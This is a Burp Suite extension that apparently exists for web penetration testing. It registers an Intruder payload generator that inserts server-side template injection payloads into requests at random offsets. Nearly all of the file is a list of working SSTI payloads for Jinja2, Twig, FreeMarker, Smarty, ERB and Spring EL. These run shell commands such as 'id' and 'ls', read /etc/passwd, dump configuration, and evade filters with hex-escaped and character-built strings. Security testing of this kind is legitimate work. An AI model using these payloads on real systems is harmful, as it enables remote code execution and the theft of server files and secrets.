from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from java.util import List, ArrayList

import random

try_num = 30
payload_list = [
    "{{2*2}}[[3*3]]",
    "{{3*3}}",
    "{{3*'3'}}",
    "<%= 3 * 3 %>",
    "${6*6}",
    "${{3*3}}",
    "@(6+5)",
    "#{3*3}",
    "#{ 3 * 3 }",
    "{{dump(app)}}",
    "{{app.request.server.all|join(',')}}",
    "{{config.items()}}",
    "{{ [].class.base.subclasses() }}",
    "{{''.class.mro()[1].subclasses()}}",
    "{{ ''.__class__.__mro__[2].__subclasses__() }}",
    "{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",
    "{{'a'.toUpperCase()}} ",
    "{{ request }}",
    "{{self}}",
    "<%= File.open('/etc/passwd').read %>",
    '<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}',
    "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}",
    '${"freemarker.template.utility.Execute"?new()("id")}',
    "{{app.request.query.filter(0,0,1024,{'options':'system'})}}",
    "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
    '{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}',
    "{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    "{$smarty.version}",
    "{php}echo `id`;{/php}",
    "{{['id']|filter('system')}}",
    "{{['cat\x20/etc/passwd']|filter('system')}}",
    "{{['cat$IFS/etc/passwd']|filter('system')}}",
    "{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",
    '{{request|attr(["_"*2,"class","_"*2]|join)}}',
    '{{request|attr(["__","class","__"]|join)}}',
    '{{request|attr("__class__")}}',
    "{{request.__class__}}",
    "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}",
    "${T(java.lang.System).getenv()}",
    "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}",
]

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.registerIntruderPayloadGeneratorFactory(self)
        return
    
    def getGeneratorName(self):
        return "SSTI Payload Generator"

    def createNewInstance(self, attack):
        return BurpFuzzer(self, attack)


class BurpFuzzer(IIntruderPayloadGenerator):
    def __init__(self, extender, attack):
        self._extender = extender
        self._helpers = extender._helpers
        self._attack = attack
        self.max_payloads = try_num
        self.num_iterations = 0
        self.num_tried = list()

        return
    
    def hasMorePayloads(self):
        if (self.num_iterations == self.max_payloads) or (len(self.num_tried) == len(payload_list)):
            return False
        else:
            return True
    
    def getNextPayload(self, current_payload):
        payload = ''.join(chr(x) for x in current_payload)

        payload = self.mutate_payload(payload)

        self.num_iterations += 1

        return payload
    
    def reset(self):
        self.num_iterations = 0
        return
    
    def mutate_payload(self, original_payload):
        offset = random.randint(0, len(original_payload) - 1)
        front, back = original_payload[:offset], original_payload[offset:]
        
        
        while True:
            sample_number = random.randint(0, len(payload_list) -1)
            if sample_number not in self.num_tried:
                    self.num_tried.append(sample_number)
                    break
        front += payload_list[sample_number]

        return front + back